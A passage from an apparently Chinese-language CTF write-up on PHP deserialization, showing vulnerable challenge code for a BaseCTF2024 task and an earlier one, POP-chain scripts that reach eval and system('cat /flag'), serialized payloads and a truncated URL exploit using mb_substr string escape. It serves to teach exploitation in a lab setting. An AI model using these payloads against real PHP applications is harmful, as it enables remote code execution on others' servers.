class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> ;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;word=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>();<br><span class="hljs-variable">$a</span>-&gt;sea=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>();<br><span class="hljs-variable">$a</span>-&gt;sea-&gt;animal=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shark</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç”±äº php ç‰ˆæœ¬ä½äº 7.1+ï¼Œè¿™é‡Œæ³¨æ„privateå­—æ®µçš„å¤„ç†ï¼Œä¿ç•™å¥½è®¿é—®æ€§ã€‚</p><p>php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿï¼Œphpååºåˆ—åŒ–privateå±æ€§æ—¶å¯ä»¥åœ¨åºåˆ—åŒ–æ—¶æ”¹æˆpublicååºåˆ—åŒ–ä¾ç„¶å¯ä»¥,ä½†æ˜¯åè¿‡æ¥å°±ä¸è¡Œäº†,å¦‚æœæ˜¯publicä½ ç”¨privateå°±ä¸è¡Œã€‚</p><h3 id="4-2-BaseCTF2024-ez-php"><a href="#4-2-BaseCTF2024-ez-php" class="headerlink" title="4.2 [BaseCTF2024]ez_php"></a>4.2 [BaseCTF2024]ez_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hackerï¼&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>(<span class="hljs-string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>].<span class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$pre</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]:<span class="hljs-string">&quot;substr&quot;</span>;<br>    <span class="hljs-variable">$ser_ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$pre</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_ctf</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;æ‚é±¼~æ‚é±¼~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ¬é¢˜ç»¼åˆæ€§å¾ˆå¼ºï¼Œè€ƒå¯Ÿphpååºåˆ—åŒ–ï¼ŒGCå›æ”¶ï¼Œå¼•ç”¨èµ‹å€¼ï¼Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œç‰¹æ®Šå˜é‡åä¼ å‚</p><p>å…ˆå†™å‡ºpopé“¾</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">destruct</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">toString</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">call</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">get</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">isset</span>-&gt;</span>invoke<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨æ³¨æ„åˆ°__wakeupä¸­å¯¹endè¿›è¡Œäº†èµ‹å€¼ï¼Œéœ€è¦ç”¨å¼•ç”¨èµ‹å€¼ç»•è¿‡å®ƒ</p><p>åé¢è¿˜æœ‰ä¸€ä¸ªå¼‚å¸¸æŠ›å‡ºï¼Œä½¿å¾—<code>__destruct</code>å¹¶ä¸èƒ½è§¦å‘ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨gcå›æ”¶çš„æœºåˆ¶ï¼Œä½¿<code>__destruct</code>æå‰è§¦å‘ï¼Œè®©<code>pop</code>é“¾èƒ½å¤Ÿå¾€åèµ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hackerï¼&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__toString&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__call&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset&quot;</span>;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-variable">$a</span>-&gt;end = &amp;<span class="hljs-variable">$a</span>-&gt;username;<br><span class="hljs-variable">$a</span>-&gt;start = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">T</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">F</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">R</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r = <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å­—ç¬¦ä¸²é€ƒé€¸</p><p>é¢˜ç›®æ­£å¸¸åºåˆ—åŒ– <code>serialize($ctf)</code>ï¼Œå¾—åˆ°</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">227</span>:<span class="hljs-string">&quot;&#123;&#123;&#123;a:2:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;O:6:&quot;</span>Hacke<span class="hljs-string">r&quot;:3:&#123;s:5:&quot;</span>start<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;O:1:&quot;</span>T<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>t<span class="hljs-string">&quot;;O:1:&quot;</span>F<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>f<span class="hljs-string">&quot;;O:1:&quot;</span>E<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>e<span class="hljs-string">&quot;;O:1:&quot;</span>R<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">r&quot;;s:18:&quot;</span>system(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span class="hljs-string">&quot;;s:6:&quot;</span>hacke<span class="hljs-string">r&quot;;s:8:&quot;</span>username<span class="hljs-string">&quot;;R:9;&#125;s:1:&quot;</span>a<span class="hljs-string">&quot;;N;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>O:6:â€Hackerâ€:3:{s:5:â€startâ€;s:227:â€{ { {æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œåé¢ä¸ç”¨ç®¡</p><p>åˆ©ç”¨<a href="https://www.cnblogs.com/gxngxngxn/p/18187578">mb_strposä¸mb_substræ‰§è¡Œå·®å¼‚å¯¼è‡´çš„æ¼æ´</a>æŠŠå‰é¢æ²¡ç”¨çš„éƒ¨åˆ†æˆªæ‰</p><p>payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">substr</span>=<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0<span class="hljs-variable">%9fab</span>&amp;ez[ser.from_you=a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span 